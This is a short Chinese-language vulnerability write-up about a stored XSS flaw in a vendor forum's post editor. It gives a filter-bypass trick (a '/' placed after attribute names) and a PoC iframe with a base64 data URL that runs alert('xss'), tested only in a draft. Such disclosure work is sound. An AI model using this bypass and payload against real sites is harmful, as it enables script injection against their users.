---
title: 帖子xss
slug: 0165
---
# 帖子xss

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965805-c1626376-a0f1-4326-b75d-7f11aa646ab0.png)

绕过思路就是

在action前面加一个/

action/=javascript:

就可以绕过

知道思路后，回到主题。

漏洞详细：

某T厂家论坛存在xss漏洞

url: https://bbbb.xxxxx.com/

登录之后我们点发帖

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965168-cf4974bf-3b2f-4d5f-8f11-e3c0ae406112.png)

然后点击行内代码

![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965203-c96f635c-436f-4c47-8726-75d98583f5eb.png)

综合我上面绕过的方法组合的poc

bypassPoc: <iframe src/="data:text/html;base64,

PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="></iframe>



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965360-e5d92f50-9a13-4835-b2e4-05b1cbc61092.png)

为了不影响正常业务就保存到草稿箱了



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965457-f42d706b-c877-4206-ad86-0bfd9200b5f9.png)

草稿箱打开也正常弹出



![img](https://cdn.nlark.com/yuque/0/2026/png/60657001/1779978965784-819a99a3-5705-4675-9cba-ca56b10ca63c.png)